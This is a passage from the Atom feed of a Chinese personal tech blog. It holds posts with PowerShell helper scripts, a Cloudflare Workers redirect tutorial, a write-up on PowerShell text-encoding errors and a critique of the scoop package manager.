</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Clear-CliProxy {
</span></span><span style="display:flex;"><span>    Remove-Item env<span style="color:#960050;background-color:#1e0010">:</span>HTTP_PROXY
</span></span><span style="display:flex;"><span>    Remove-Item env<span style="color:#960050;background-color:#1e0010">:</span>HTTPS_PROXY
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="time">time</h2>
<p>为命令行应用计时，大概类似于 <em>*nix</em> 中的 <code>time</code>。用法是 <code>time app command</code>。</p>
<p>仅仅计时的话可以用 <code>Measure-Command</code> 命令，但它没有输出，只有时间信息，所以写了个 function 封装一下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> time {
</span></span><span style="display:flex;"><span>    $Command = <span style="color:#e6db74">&#34;</span>$args<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $time = Measure-Command { Invoke-Expression $Command <span style="color:#ae81ff">2</span>&gt;&amp;<span style="color:#ae81ff">1</span> | out-default }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $info = <span style="color:#e6db74">&#34;{0:d2}:{1:d2}:{2:d2}.{3}&#34;</span> <span style="color:#f92672">-f</span> $time.Hours, $time.Minutes, $time.Seconds, $time.Milliseconds
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Write-Output $info
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="get-size">Get-Size</h2>
<p>命令行里查看文件夹、文件的大小，按 M 显示。用法是 <code>Get-Size folder/file</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Get-Size {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>([<span style="color:#66d9ef">string</span>]$pth)
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;{0:n2}&#34;</span> <span style="color:#f92672">-f</span> ((Get-ChildItem -path $pth -recurse | measure-object -property length -sum).sum / <span style="color:#ae81ff">1</span>mb) + <span style="color:#e6db74">&#34; M&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="翻译">翻译</h2>
<p>命令行里的翻译程序，其实之前是想用 go 写一个的，但不如直接写个 pwsh 脚本简便。由于 api key 是扒的别人的，所以就在源码里删去了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> fy {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($args.Length <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">0</span> ) {
</span></span><span style="display:flex;"><span>        Write-Output <span style="color:#e6db74">&#39;this is a cli translator, try `fy hello world`.&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $query = <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $args.Count; $i++) {
</span></span><span style="display:flex;"><span>            $query += <span style="color:#e6db74">&#34; &#34;</span>
</span></span><span style="display:flex;"><span>            $query += $args[$i]
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $ApiUrl = <span style="color:#e6db74">&#34;redacted&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $info = (Invoke-WebRequest $ApiUrl).Content | ConvertFrom-Json
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;@&#34;</span> $query  <span style="color:#e6db74">&#34;[&#34;</span> $info.basic.phonetic <span style="color:#e6db74">&#34;]&#34;</span>
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;翻译：</span><span style="color:#ae81ff">`t</span><span style="color:#e6db74">&#34;</span> $info.translation
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;词典：&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $info.basic.explains.Count; $i++) {
</span></span><span style="display:flex;"><span>            Write-Host <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`t</span><span style="color:#e6db74">&#34;</span> $info.basic.explains[$i]
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        Write-Host <span style="color:#e6db74">&#34;网络：&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $info.web.Count; $i++) {
</span></span><span style="display:flex;"><span>            Write-Host <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`t</span><span style="color:#e6db74">&#34;</span> $info.web[$i].key <span style="color:#e6db74">&#34;: &#34;</span> -NoNewline
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> ($j = <span style="color:#ae81ff">0</span>; $j <span style="color:#f92672">-lt</span> $info.web[$i].value.Count; $j++) {
</span></span><span style="display:flex;"><span>                Write-Host $info.web[$i].value[$j] <span style="color:#e6db74">&#34;; &#34;</span> -NoNewline
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            Write-Host <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>]]></content><category scheme="https://blog.batkiz.com/tags/powershell" term="powershell" label="powershell"/></entry><entry><title type="html">无服务器实现 301 跳转（with Cloudflare）</title><link href="https://blog.batkiz.com/posts/301-redirect-with-cloudflare/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/301-redirect-with-cloudflare/</id><published>2020-07-16T22:26:33+08:00</published><updated>2020-07-16T22:26:33+08:00</updated><content type="html"><![CDATA[<h2 id="原因">原因</h2>
<p>我想通过 git.batkiz.com 访问我的 Azure DevOps 主页，但其不支持 CNAME，同时我又不想通过服务器来 301 跳转，所以我就寻思着能不能找个方法白嫖。</p>
<p>下面是通过 Cloudflare 白嫖的教程。</p>
<h2 id="完整步骤">完整步骤</h2>
<h3 id="新建-workers">新建 workers</h3>
<p>workers 即 Cloudflare 推出的 serverless 云函数。在 <a href="https://dash.cloudflare.com/">主页</a> 直接点击 workers 新建一个，名字随意，代码如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleRequest</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">Response</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#a6e22e">someURLToRedirectTo</span>, <span style="color:#a6e22e">code</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;fetch&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">event</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">respondWith</span>(<span style="color:#a6e22e">handleRequest</span>());
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @param {Request} url where to redirect the response
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * @param {number?=301|302} type permanent or temporary redirect
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">someURLToRedirectTo</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://batkiz.visualstudio.com/&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">301</span>;
</span></span></code></pre></div><p>部署好之后即可通过其 <code>workers.dev</code> 域名访问了，其会在访问时 301 跳转到指定页。</p>
<p>可是 <code>workers.dev</code> 的域名太长了，也与最初的需求（通过 git.batkiz.com 访问我的 Azure DevOps 主页）不符。因此需要通过某种手段把此域名 CNAME 到 git.batkiz.com 这个域名上。</p>
<p>但云函数显然是没有 CNAME 这个说法的，所以需要借助其他路由来实现。</p>
<h3 id="其他路由">其他路由</h3>
<p>从 <a href="https://dash.cloudflare.com/">dash</a> 点进需要的域名设置，进入其 workers tab，选择添加路由即可。</p>
<p>路由示例：<code>*git.batkiz.com/*</code>，选择匹配的 worker 即可。</p>
<p>而后进入 dns 编辑页，给所用的域名（本例中为 git.batkiz.com）添加一个 A 记录，指向 <code>192.2.0.1</code>。</p>
<p>然后就能用啦！</p>
<hr>
<h2 id="参考">参考</h2>
<ol>
<li><a href="https://community.cloudflare.com/t/setup-workers-on-personal-domain/88012">Setup Workers on Personal Domain</a></li>
<li><a href="https://developers.cloudflare.com/workers/about/routes/">https://developers.cloudflare.com/workers/about/routes/</a></li>
</ol>
]]></content></entry><entry><title type="html">powershell, headers 与乱码</title><link href="https://blog.batkiz.com/posts/pwsh-headers-and-messy-code/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/oh-my-powershell/?utm_source=atom_feed" rel="related" type="text/html" title="oh my powershell"/><link href="https://blog.batkiz.com/posts/some-pwsh-scripts/?utm_source=atom_feed" rel="related" type="text/html" title="一些 powershell 脚本"/><link href="https://blog.batkiz.com/posts/lets-roll-to-wsl2/?utm_source=atom_feed" rel="related" type="text/html" title="滚进 wsl2"/><link href="https://blog.batkiz.com/posts/using-scoop/?utm_source=atom_feed" rel="related" type="text/html" title="初探 Scoop"/><link href="https://blog.batkiz.com/posts/using-wsl/?utm_source=atom_feed" rel="related" type="text/html" title="wsl 使用指北"/><id>https://blog.batkiz.com/posts/pwsh-headers-and-messy-code/</id><published>2020-06-27T20:58:36+08:00</published><updated>2020-06-27T20:58:36+08:00</updated><content type="html"><![CDATA[<h2 id="问题起源">问题起源</h2>
<p>在几天之前，我的<a href="https://github.com/batkiz/dotfiles/blob/3497c735909dda8b95c62da5ffaffc34cb0b09ee/pwsh/Microsoft.PowerShell_profile.ps1#L123">命令行翻译程序</a>挂掉了，不过由于平时用的也少，所以就没太管，昨天才想起来再找个 API 用。</p>
<p>正如前文所述，我极少用到这个，所以我就懒得去申请腾讯、彩云或是 bing 的 API，毕竟太麻烦了。因此我决定找一个直接提供公用接口的 API，次数限制啥的只要不是太离谱就行。功夫不负有心人，在 Google 上翻了两页之后，我找到了由 <a href="http://nlp.xmu.edu.cn/">厦门大学自然语言处理实验室</a> 提供的 <a href="http://nmt.xmu.edu.cn/">云译 CloudTranslation</a> 的公开 <a href="http://nmt.xmu.edu.cn/static/api_zh-cn.html">API</a>。</p>
<h2 id="解决过程">解决过程</h2>
<p>就当我读完短短的 API Doc 后准备开始写段小脚本时，悲剧发生了：它竟然乱码了！</p>
<p><img src="https://s1.ax1x.com/2020/06/27/NckFpV.png" alt="图中的 Content 与 RawContent 都是乱码的"></p>
<p>然后我也很不能相信，于是又回去读了读文档，看到<a href="http://nmt.xmu.edu.cn/static/api_zh-cn.html#_4">其中</a>清楚地写着：</p>
<blockquote>
<p>返回格式： UTF-8 编码纯文本</p>
</blockquote>
<p>WHAT THE F@XK? 我的 Windows 系统一直都是默认 unicode 的，而当前 pwsh 的活动代码页也是 <code>65001</code>。换言之，这个接口的返回值乱码绝对不是本地是 gbk/gb2312 这种低级错误。那问题出在哪呢？</p>
<p>为了确定它返回的编码确实是 utf-8，我看了看它的 headers，以防出现他本身发送的是 gbk/gb2312 这种乌龙。</p>
<p><em>通过 <a href="http://www.mytju.com/classCode/tools/messyCodeRecover.asp">乱码恢复</a> 确定了乱码文字现在的编码是 iso-8859-1，其本身确实是 utf-8 的。</em></p>
<p><img src="https://s1.ax1x.com/2020/06/27/NcARqe.png" alt="看起来并没有问题"></p>
<p>打眼一看确实没啥问题，但我注意到了其中并没有指定 charset/encoding 信息。</p>
<p>以防万一，我又在 wsl 中用 curl 对比执行了一下：</p>
<p><img src="https://s1.ax1x.com/2020/06/27/NcAYvT.png" alt="完 全 正 常"></p>
<p>此时我已经基本确定，乱码是因为 headers 中缺了东西导致的，但为什么会导致这种问题呢？我想让他不乱码难道就只能通过 wsl 来调用 API 了么？</p>
<p>然后通过我<del>西安市 top3 的信息检索能力</del>的 Google 技术，找到了这个 StackOverflow 回答：</p>
<blockquote>
<p>The problem is that Spotify is (unwisely) not returning the encoding it&rsquo;s using in its headers. PowerShell obeys the standard by assuming ISO-8859-1, but unfortunately the site is using UTF-8. <a href="https://stackoverflow.com/a/47961370/8553961">src</a></p>
</blockquote>
<p>即一则网站未按规范在 headers 中指定编码信息；二则 powershell 遇到未指定编码的内容时，会假设其编码为 ISO-8859-1，问题就这样出现了。</p>
<p>想要解决也很简单，把内容从 ISO-8859-1 编码转换回 utf-8 即可。</p>
<h2 id="等等还有一个问题">等等，还有一个问题</h2>
<p>命令行中的问题解决了，浏览器中的呢？</p>
<p>如果在浏览器中打开 <a href="https://nmt.xmu.edu.cn/nmt?lang=en_zh-cn&amp;src=Neural%20Machine%20Translation">此示例</a>，浏览器中的内容会是 <em>绁炵粡鏈哄櫒缈昏瘧</em>，是被错误以 gbk 解码而出现的乱码，这个问题在 chromium 与 firefox 上都会出现。</p>
<p>然而在开发者工具的 network 中查看时，其响应会是正常的。时间与才学所限没能细看 chromium/firefox 的源代码，希望有朋友知道的话能指教一二（可看关于页中我的联系方式）。</p>
]]></content><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="windows"/><category scheme="https://blog.batkiz.com/tags/powershell" term="powershell" label="powershell"/></entry><entry><title type="html">在 winget 到来之际，再谈谈 scoop</title><link href="https://blog.batkiz.com/posts/talk-about-scoop/?utm_source=atom_feed" rel="alternate" type="text/html"/><id>https://blog.batkiz.com/posts/talk-about-scoop/</id><published>2020-05-21T15:56:06+08:00</published><updated>2020-05-21T15:56:06+08:00</updated><content type="html"><![CDATA[<p>Microsoft Build 2020 开发者大会在几天前召开了，除了 .NET, C# 等的常规更新之外，微软也发布了全新的、官方支持的命令行安装工具 winget。winget 出现的意义不用多说：Windows 终于迎来了受官方支持的命令行安装工具。此前虽然有 choco, scoop 等，但都只是第三方工具而已，如今微软第一方下场，无疑给开发者们带来了极大的鼓舞。</p>
<p>winget 的使用体验我一直有在 <a href="https://t.me/batkizc">Telegram 频道</a> 里更新，在这里不再多谈——winget 目前还没到 1.0 版本，现在只是 preview 而已，某些点今天谈完可能第二天就给更新了。或许到了 1.0 版本释出时我会再更一篇文章吧。</p>
<h2 id="谈谈-scoop-现有的问题">谈谈 scoop 现有的问题</h2>
<p>我在这里更想谈一谈 scoop 这个第三方的 <code>cli installer</code>。我一直一来都是一个 scoop 吹，本博客之前也曾介绍过 scoop<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>，但经过了这一年多的使用，我也逐渐意识到了许多问题，这些问题或许不是“痛点”，但却总让人有股隔靴搔痒的无力感。</p>
<h3 id="重名问题">重名问题</h3>
<p>当多个 bucket 内有同名 manifest 时，会按照 bucket 的顺序，自动安装最靠前的 manifest。比如我的 <a href="https://github.com/batkiz/backit">backit</a> 与 main bucket 里都存在 ffsend，执行 <code>scoop install ffsend</code> 时，scoop 会安装 backit/ffsend，而非有一个询问。虽然可以用 <code>scoop install main/ffsend</code> 来指定安装，但 scoop 官方是应该注意到这一点的，而非让用户每次都 search 一下。</p>
<h3 id="不受关注的软件">不受关注的软件</h3>
<p>scoop 的 bucket 是靠社区维护的，通常情况下这意味着 bug 更容易被发现——最先发现问题的人通常都会去开 issue 或 pull request。</p>
<p>但当某个软件没那么受人关注，或人们根本没有发现其问题时，就出现另一个问题了：scoop 里的软件版本滞后于官方。</p>
<p>比如 <a href="https://github.com/o2sh/onefetch">onefetch</a>，在 2019/11/06 的 manifest 更新 <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> 之后，onefetch 在自己的 release 里发布了 3 个新版本<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>，而 scoop 里的 manifest 再无更新。虽然这是因为 onefetch 的 release 总是变换命名风格，但 scoop 应该尽力避免这一问题。</p>
<h3 id="人手过少与软件过多">人手过少与软件过多</h3>
<p>ScoopInstaller 组织里公开显示的有 8 个人<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>，而足够活跃的仅仅有 <a href="https://github.com/r15ch13">@r15ch13</a> 与 <a href="https://github.com/Ash258">@Ash258</a> 两个人<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>，scoop 并非一个有盈利的项目，这两位也都不是全职维护 scoop，这两人除了自己的本职工作外，能有多少时间投入进来呢？</p>
<p>而仅 main 与 extras 两个 bucket 的软件数量，就已经达到了 1786 个，虽然有社区的力量，但每天 review PR 都够累死的。</p>
<p><img src="https://s1.ax1x.com/2020/05/21/Yb13Mq.png" alt="main 与 extras 包含的 manifest 数量。2020/05/21 15:14"></p>
<p>当一个 bucket 只有 20 个软件时（指我的 backit），维护者完全有精力隔三岔五地看一眼整个的 checkver 的 log，但当一个 bucket 有 200 个时，就完全不一样了。就比如现在的 main bucket 经常会出现更新滞后的情况，毕竟更新脚本跑起来也是需要时间的。（有兴趣的可以比较一下 <a href="https://github.com/batkiz/backit">batkiz/backit</a> 与 <a href="https://github.com/ScoopInstaller/Main">ScoopInstaller/Main</a> 里 ffsend 的更新时间。）</p>
<h3 id="功能停滞">功能停滞</h3>
<p>人手过少带来的另一个问题就是 scoop 本身的功能更新几乎停滞，今年以来在 master 分支上仅仅有两个 commit<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup>，还都是 fix。新功能的添加也是如此，<code>scoop download</code> 命令<a href="https://github.com/lukesampson/scoop/issues/1804">早在 2017 年就被 issue 提出</a>，而 2019/12/06 的 #3782 PR 为 scoop 添加了此功能，一直未被合并，今年 5 月又被离奇关闭<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup>。让人不得不担心 scoop 项目的发展。</p>
<h3 id="没有明确的-roadmap">没有明确的 roadmap</h3>
<p>scoop 项目至今已经发展了 7 年，却仍没有一个明确的 roadmap，功能的更新也毫无规划。官方的几位开发者除了偶尔对 scoop 进行更新外，每天在忙的就是处理 bucket 里的各种 issue，审批望不到尽头的 PR。</p>
<h3 id="shim-带来的问题">shim 带来的问题</h3>
<p>scoop 的一个功能特性就是防止 <em>Path pollution from installing lots of programs</em><sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup>，由于 Windows 上并没有像 *nix 上一样强大的链接，这一点是靠所谓的 <em>shim</em> 实现的。shim 的作用基本就是对 example 生成一个非常小的 example.exe，读取 example.shim 内指定的源 example.exe 路径，（传递命令行参数并）将其启动。</p>
<p>这是一个非常聪明的做法，但有时候却也会带来问题。如在 Windows terminal 里，如果用 pwsh shim 作为启动的 shell，会导致对接收到的 <code>Ctrl + c</code> 的处理不正常：我们想要的是将当前正在运行的命令强行停止，pwsh shim 却会直接将 pwsh 停止。<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup>虽然我们可以通过指定 pwsh 原路径的方法避免，但这又有违了 scoop 进行 shim 的初衷。</p>
<h3 id="依赖问题">依赖问题</h3>
<p>有些读者可能看到这里会有些迷惑，解决依赖问题怎么会成为一个问题呢？*nix 上的包管理器不都是在吹自己能处理好依赖吗？</p>
<p>在通常情况下有且仅有一个 package manager 的 *nix 系统之上，包管理器帮助解决依赖问题会很棒。</p>
<p>但在 Windows 系统上，一切都变了：几乎所有软件都没有依赖，最多是 msvc runtime/dotnet runtime；同时用户安装软件的来源也是五花八门的：从官网下载的 exe 文件、MS Store、scoop、choco 等“包管理器”等等等等。</p>
<p>这种情况下，当 scoop 试图接管依赖处理时，就非常令人不爽了。由于 scoop 是按 package 来设定的依赖，而非在环境变量中搜寻是否存在需要的 exe 文件。当你通过其他方式安装了 A，又想要通过 scoop 安装依赖于 A 的 B 时，scoop 只会再给你安装一份 A，非常之 unintelligible。<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup></p>
<p>这样的依赖处理方式还带来了另外一个问题：卸载软件时，无法顺带卸载其不会再用到的依赖。scoop 并没有区分 lib 与 exe，这样也就无法确定你的软件是否能被安全地移除。最终只能是用户在无意间 <code>scoop list</code> 时，发现一个自己毫无印象的软件，然后将其卸载。</p>
<h3 id="我们真的如同我们想象的那般需要-portable-吗">我们真的如同我们想象的那般需要 portable 吗</h3>
<p>scoop 在普通情况下非常之 portable，理论上 <code>$env:SCOOP</code> 下的文件可以在不同电脑间相互移动，所需要的仅仅是设定好 scoop 所需要的几个环境变量——但是等等，我们真的需要这一点吗？</p>
<p>scoop 的 nonportable bucket 与种种以 <code>-np</code> 结尾的 manifest 已经证实了 portable 不是灵丹妙药，是不能解决所有的软件的：比如 Windows terminal 等以 appx 为打包格式的软件，根本无法指定安装地址；yarn-np 等软件如果进行极端的 portable 化会导致每次更新都丢数据。</p>
<p>不可否认，这个世界上有很多人同时使用多台电脑，或者想要完全的 portable 软件。但对我们这些仅仅拥有一台电脑、并不太在意软件是否是 portable 的、甚至根本不在乎环境变量是不是被污染的人呢？为了 portable, path clean 而付出的额外的代价，我们是否也应该承受呢？仅就我而言，需要的可能只是一个恰倒好处的 <em>CLI installer</em> 罢了。</p>
<hr>
<h2 id="设计一个-cli-installer">设计一个 CLI installer</h2>
<p>scoop 无疑是一个值得使用的 <em>package manager</em>，上面列出了的种种缺点也都是站在我个人立场上的，毕竟吾之蜜糖，彼之砒霜，适合自己的才是最好的。</p>
<p>但如果让我来设计的话，一个完全只符合我 <strong>个人需求</strong> 的 CLI installer 会是怎么样的呢？</p>
<ul>
<li>安装过程通过 pwsh 脚本定义，增强自由度。</li>
<li>对 exe, msi, appx 等用 inno, Add-AppxPackage 等安装，参考 winget。</li>
<li>对 zip 进行解压等，将 manifest 中定义的 bin 写入环境变量。</li>
<li>卸载过程则参考 winget 后续的动作。</li>
<li>dependencies 则是在 manifest 中写入所需的 exe，安装过程中搜寻整个环境变量，如果不存在则推荐安装，并不强制。</li>
<li>利用 GitHub API，manifest 的自动更新出问题时自动新建 issue。</li>
<li>数据持久化仅在 update 时进行，通过 manifest 中定义的文件/文件夹或脚本，来在不同版本文件夹间互相复制等。</li>
</ul>
<p>当然，这只是目前的构想，后续的开发过程中一定会有所更改。</p>
<p>那么问题来了，我什么时候能用上这个 CLI installer 呢？</p>
<p>下周发布 PPT，今年 12 月第一阶段开源！（逃</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="#ZgotmplZ">初探 Scoop</a>，2018/12/31&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://github.com/lukesampson/scoop-extras/commit/063694cae5019119e117fae5458219d8e32397d0">https://github.com/lukesampson/scoop-extras/commit/063694cae5019119e117fae5458219d8e32397d0</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://github.com/o2sh/onefetch/releases">https://github.com/o2sh/onefetch/releases</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p><a href="https://github.com/orgs/ScoopInstaller/people">https://github.com/orgs/ScoopInstaller/people</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>由 <a href="https://github.com/ScoopInstaller/Main/graphs/contributors">Main/contributors</a> 与 <a href="https://github.com/lukesampson/scoop-extras/graphs/contributors">extras/contributors</a> 得出的结论&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p><a href="https://github.com/lukesampson/scoop/commits/master">https://github.com/lukesampson/scoop/commits/master</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p><a href="https://github.com/lukesampson/scoop/pull/3782">feat: Present download command #3782</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p><a href="https://github.com/lukesampson/scoop#what-does-scoop-do">what-does-scoop-do</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p><a href="https://github.com/PowerShell/PowerShell/issues/11314">pwsh as a dotnet global tool exhibits very unusual behavior with Ctrl-C</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p><a href="https://github.com/lukesampson/scoop-extras/issues/3200">https://github.com/lukesampson/scoop-extras/issues/3200</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content><category scheme="https://blog.batkiz.com/tags/scoop" term="scoop" label="scoop"/><category scheme="https://blog.batkiz.com/tags/windows" term="windows" label="Windows"/><category scheme="https://blog.batkiz.com/tags/winget" term="winget" label="winget"/></entry><entry><title type="html">一些 powershell 脚本</title><link href="https://blog.batkiz.com/posts/some-pwsh-scripts/?utm_source=atom_feed" rel="alternate" type="text/html"/><link href="https://blog.batkiz.com/posts/oh-my-powershell/?utm_source=atom_feed" rel="related" type="text/html" title="oh my powershell"/><id>https://blog.batkiz.com/posts/some-pwsh-scripts/</id><published>2020-05-13T21:34:09+08:00</published><updated>2020-05-13T21:34:09+08:00</updated><content type="html"><![CDATA[<p>近期写的、收集的一些 pwsh 脚本，我完整的 pwsh 配置可看 <a href="https://github.com/batkiz/dotfiles">batkiz/dotfiles</a>。</p>
<p>由于主要是为了满足个人使用，所以没怎么做错误处理之类的。</p>
<h2 id="在-pwsh-中使用-wsl-中的-nvim">在 pwsh 中使用 wsl 中的 nvim</h2>
<p><code>dos2nix</code> 是将 windows 风格的路径转换为 wsl 中的路径。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> dos2nix {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span>($dosPath)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $path = $dosPath.Replace(<span style="color:#e6db74">&#39;\&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($path <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;[a-zA-Z]:.*&#39;</span>) {
</span></span><span style="display:flex;"><span>        $drive = $path.split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">0</span>].ToLower()
</span></span><span style="display:flex;"><span>        $filePath = $path.split(<span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        $nixPath = <span style="color:#e6db74">&#39;/mnt/&#39;</span> + $drive + $filePath
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $nixPath = $path
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    $nixPath
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> vim {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span> (
</span></span><span style="display:flex;"><span>        $Path = <span style="color:#e6db74">&#39;.&#39;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($Path <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#39;.&#39;</span>) {
</span></span><span style="display:flex;"><span>        $Path = <span style="color:#e6db74">&#39;.&#39;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $Path = dos2nix -dosPath $Path
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
